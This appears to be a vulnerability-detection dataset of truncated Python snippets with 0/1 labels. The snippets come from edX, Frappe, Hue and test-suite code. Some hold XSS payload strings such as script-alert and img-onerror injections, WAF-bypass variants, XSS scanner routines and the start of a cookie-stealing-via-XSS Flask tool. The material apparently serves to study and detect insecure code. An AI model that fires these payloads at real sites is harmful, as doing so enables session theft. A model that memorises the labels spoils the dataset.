'staticbook.views.html_index'), url(r'^courses", "label": 1}, {"snippet_id": 10604, "code": ".utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY", "label": 0}, {"snippet_id": 9199, "code": "/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', ", "label": 1}, {"snippet_id": 34438, "code": " \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self,", "label": 0}, {"snippet_id": 16182, "code": " 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$", "label": 0}, {"snippet_id": 56, "code": "'Content-Type']: if 'application/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None", "label": 1}, {"snippet_id": 13298, "code": "'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id", "label": 0}, {"snippet_id": 26424, "code": ", \"<img src=x onerror=prompt(/test/)>\", \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\", \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\", "label": 1}, {"snippet_id": 25292, "code": "') return data def render(self, name: str, value, attrs=None, renderer=None) -> str: if not isinstance(value, list): value=self.decompress(value) output=[] final_attrs=self.build_attrs(attrs or dict())", "label": 0}, {"snippet_id": 6089, "code": "'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': 'http://localhost:8550/', 'insecure_cookies': '0', } _CONFIG_SECTION='eduid_idp' class IdPConfig(object)", "label": 0}, {"snippet_id": 2633, "code": " host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\":", "label": 0}, {"snippet_id": 47825, "code": "\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName=displayname user.dect", "label": 1}, {"snippet_id": 9683, "code": ".get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth", "label": 0}, {"snippet_id": 36349, "code": "\tCalled from within standard print format.\"\"\" \t\tdoc=getattr(self, \"parent_doc\", self) \t\tif hasattr(doc, \"format_data_map\"): \t\t\treturn fieldname in doc.format_data_map \t\telse: \t\t\treturn True \tdef reset_values_if_no_permlevel_access", "label": 0}, {"snippet_id": 9694, "code": "'AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid", "label": 0}, {"snippet_id": 7741, "code": "', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/", "label": 0}, {"snippet_id": 46644, "code": ".with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html' form_class=EntryForm def get(self, request, *args, **kwargs): form=self.get_form() if form.is_valid(): return", "label": 0}, {"snippet_id": 14003, "code": "', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action", "label": 0}, {"snippet_id": 33980, "code": "\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t", "label": 0}, {"snippet_id": 14404, "code": "'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r", "label": 0}, {"snippet_id": 41277, "code": "\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route", "label": 0}, {"snippet_id": 20363, "code": ") cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super", "label": 0}, {"snippet_id": 32460, "code": " used as a replacement character for spaces in the title, typically set to '-'. Since we emulate Gitiles' way of slugification here, it makes little sense to have the separator charactor configurable. \"\"\"", "label": 0}, {"snippet_id": 11522, "code": "'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$", "label": 0}, {"snippet_id": 32224, "code": "(THIS_DIR)) sys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port", "label": 0}, {"snippet_id": 48450, "code": "\"]) else: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id)) return response def write_db_reservation_action(request: HttpRequest): \"\"\" This function is used to submit the", "label": 0}, {"snippet_id": 40957, "code": " find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category'", "label": 0}, {"snippet_id": 21675, "code": ", name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 8858, "code": ".views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if", "label": 0}, {"snippet_id": 31176, "code": ".waf_install(form.getvalue('installwaf')) \t if form.getvalue('metrics_waf'): \tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable')) \t\t if form.getvalue('table_metrics'): \timport", "label": 0}, {"snippet_id": 48611, "code": "(request.POST) print(sr.notes) return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\"&srid=\" +str(sr.id)) if \"rid\" in request.GET: r=GroupReservation.objects.get(id", "label": 0}, {"snippet_id": 29365, "code": "') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath", "label": 0}, {"snippet_id": 52297, "code": ".update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.')", "label": 0}, {"snippet_id": 11595, "code": "=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name", "label": 0}, {"snippet_id": 9870, "code": "]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args", "label": 0}, {"snippet_id": 64, "code": "'Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse", "label": 1}, {"snippet_id": 20654, "code": "'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request'", "label": 0}, {"snippet_id": 14790, "code": "'tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite", "label": 1}, {"snippet_id": 53422, "code": "('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie", "label": 0}, {"snippet_id": 52765, "code": " mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')", "label": 0}, {"snippet_id": 14065, "code": "<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9", "label": 0}, {"snippet_id": 45850, "code": "' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir", "label": 0}, {"snippet_id": 8368, "code": "+=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status", "label": 0}, {"snippet_id": 25971, "code": " class BaseInvoiceAddressForm(forms.ModelForm): vat_warning=False class Meta: model=InvoiceAddress fields=('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id', 'internal_reference", "label": 0}, {"snippet_id": 30741, "code": " \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit", "label": 0}, {"snippet_id": 11697, "code": ", url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile", "label": 0}, {"snippet_id": 32917, "code": " href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.'): continue self.wfile.write('<a href=\"%s/%s\">%s", "label": 1}, {"snippet_id": 20131, "code": "{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses()", "label": 0}, {"snippet_id": 31025, "code": ".syn_flood_protect(master) \t\tfunct.syn_flood_protect(slave) \t \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit", "label": 0}, {"snippet_id": 53307, "code": " coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects.get_docs(request.user, Document2", "label": 0}, {"snippet_id": 46746, "code": " mistune from tortoise import fields from tortoise.query_utils import Q from arq import create_pool from config import REDIS_URL from.base import BaseModel from.mc import cache, clear_mc from.user import", "label": 0}, {"snippet_id": 20554, "code": " staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url", "label": 0}, {"snippet_id": 25457, "code": "{}) ) defaults.update(**kwargs) for fname, label, size in self.scheme['fields']: defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields", "label": 0}, {"snippet_id": 33276, "code": " builders that didn't have builds for a long time.\"\"\" @decorators.require_cronjob def get(self): service.unregister_builders() def get_frontend_routes(): endpoints_services=[ legacy_api.BuildBucketApi,", "label": 0}, {"snippet_id": 23681, "code": ".TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. ", "label": 1}, {"snippet_id": 22769, "code": "'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P", "label": 1}, {"snippet_id": 53444, "code": ", type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators", "label": 0}, {"snippet_id": 31830, "code": "(list, \"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content')) \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>", "label": 0}, {"snippet_id": 34208, "code": "=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname): \t\t\t\t_class=getattr(module, classname) \t\t\t\tif issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t", "label": 0}, {"snippet_id": 7898, "code": "'staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 5593, "code": "\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\" ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"", "label": 0}, {"snippet_id": 48014, "code": " not(u==user) and u.rights < 4: return redirect(\"/admin?error='You're not allowed to edit other users.'\") medium=Media.objects.get(pk=int(media_id)) user.avatarMedia=medium user.save() except Exception as", "label": 0}, {"snippet_id": 36473, "code": ".doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{", "label": 0}, {"snippet_id": 15276, "code": "-when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self", "label": 0}, {"snippet_id": 45166, "code": "[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']", "label": 0}, {"snippet_id": 20103, "code": "--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok", "label": 0}, {"snippet_id": 13249, "code": ", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 35741, "code": "\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length", "label": 0}, {"snippet_id": 16932, "code": " name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',", "label": 0}, {"snippet_id": 12241, "code": ".pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook", "label": 1}, {"snippet_id": 11253, "code": ") return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self", "label": 0}, {"snippet_id": 22486, "code": "', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views", "label": 0}, {"snippet_id": 19164, "code": "{verify_xss}' \" \"nosetests{repo_dir}/common/test/acceptance/{exp_text} \" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store,", "label": 0}, {"snippet_id": 18338, "code": "\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+", "label": 1}, {"snippet_id": 12122, "code": ", 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 1}, {"snippet_id": 3944, "code": "(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1", "label": 0}, {"snippet_id": 47474, "code": "(http_request) if current_user.rights > 3: if not profile: f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED)) else: m: CheckEnum=CheckEnum.CHECKED if not profile.active", "label": 0}, {"snippet_id": 24113, "code": " inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh", "label": 0}, {"snippet_id": 3813, "code": " impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True", "label": 0}, {"snippet_id": 42387, "code": "\tfieldname=[df.fieldname for df in self.meta.get_table_fields() if df.options==doctype] \t\treturn fieldname[0] if fieldname else None \tdef db_insert(self): \t\t\"\"\"INSERT the document(with valid columns) in", "label": 0}, {"snippet_id": 53897, "code": " Cookie Using Xss..]\\n\\n') print(colored('\\n\\n[*] ','yellow')+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie", "label": 1}, {"snippet_id": 48031, "code": ".objects.get(pk=int(media_id)) user.avatarMedia=medium user.save() except Exception as e: return redirect(\"/admin?error=\" +str(e)) return redirect(\"/admin/users\") def handle_file(u: Profile, headline: str", "label": 0}, {"snippet_id": 1423, "code": ") break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result", "label": 0}, {"snippet_id": 23641, "code": " for the bok-choy paver commands themselves. Run just this test with: paver test_lib -t pavelib/paver_tests/test_paver_bok_choy_cmds.py \"\"\" import os import unittest from mock import patch, call from test", "label": 0}, {"snippet_id": 14335, "code": "( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider", "label": 0}, {"snippet_id": 16353, "code": "'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r", "label": 0}, {"snippet_id": 36573, "code": " \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d) \t\t\tif limit and(len(out)-1)==limit: \t\t\t\tbreak ", "label": 0}, {"snippet_id": 2774, "code": " parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text", "label": 0}, {"snippet_id": 9072, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 11791, "code": "', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {", "label": 0}, {"snippet_id": 53251, "code": "(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission", "label": 0}, {"snippet_id": 46683, "code": " for q in entry_form_config} data={ f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids } if data: kwargs['data']=data return kwargs def form_valid(self, form): selected_flags", "label": 0}, {"snippet_id": 48169, "code": "=request.POST[\"headline\"] category=request.POST[\"category\"] text=request.POST[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user, headline, category, text, file", "label": 0}, {"snippet_id": 48233, "code": " ArticleRequested, Article, ArticleGroup, SubReservation from.magic import get_current_user import json import datetime RESERVATION_CONSTRUCTION_COOKIE_KEY: str=\"org.technikradio.c3shop.frontpage\" +\\ \"", "label": 0}, {"snippet_id": 45505, "code": " PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def list_editor_bundles(request): bundles=[d.content_object for d in Document.objects", "label": 0}, {"snippet_id": 23058, "code": "/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading", "label": 0}, {"snippet_id": 21431, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 34978, "code": "(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for", "label": 0}, {"snippet_id": 22278, "code": "/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views", "label": 0}, {"snippet_id": 50496, "code": "\"\" csessid=request.args.get('csessid')[0] try: sess=self.sessionhandler.sessions_from_csessid(csessid)[0] sess.sessionhandler.disconnect(sess) except IndexError: self.client_disconnect(csessid) return ", "label": 0}, {"snippet_id": 4143, "code": " result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\":", "label": 0}, {"snippet_id": 39617, "code": ".idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing=[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t", "label": 0}, {"snippet_id": 44387, "code": " delete_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id'", "label": 0}, {"snippet_id": 10626, "code": " BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for reports(e.g.,", "label": 0}, {"snippet_id": 49081, "code": "(self.current_columns) @property def priority(self): if self.is_ordered(): return self.current_columns.index(self.column_id) +1 def is_ordered(self): return self.column_id in self.current_columns def is_reverse", "label": 0}, {"snippet_id": 23346, "code": " urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),", "label": 0}, {"snippet_id": 38990, "code": " \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif", "label": 0}, {"snippet_id": 2193, "code": ".insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri", "label": 0}, {"snippet_id": 18622, "code": "<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9", "label": 0}, {"snippet_id": 910, "code": " uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload", "label": 0}, {"snippet_id": 15614, "code": " the directory that contains the directories that have courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`", "label": 0}, {"snippet_id": 6100, "code": "'insecure_cookies': '0', } _CONFIG_SECTION='eduid_idp' class IdPConfig(object): \"\"\" Class holding IdP application configuration. Loads configuration from an INI-file at instantiation. :param filename: string, INI", "label": 0}, {"snippet_id": 53087, "code": ", description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties", "label": 0}, {"snippet_id": 6002, "code": "\"eduID SAML frontend IdP\", long_description=README, classifiers=[ ], keywords='eduID SAML', author='Fredrik Thulin', author_email='fredrik@thulin.net', license='BSD', packages=['eduid_idp',], package_dir", "label": 0}, {"snippet_id": 4593, "code": "'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', ", "label": 0}, {"snippet_id": 13113, "code": "<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),", "label": 0}, {"snippet_id": 17843, "code": "'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$", "label": 0}, {"snippet_id": 28512, "code": "=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/keep_alive-\"+get_data('logs')+\".log\", \"a", "label": 0}, {"snippet_id": 22760, "code": "\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus", "label": 0}, {"snippet_id": 28, "code": "] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def", "label": 0}, {"snippet_id": 54905, "code": " import( require_AJAX, readonly_exists, ) from 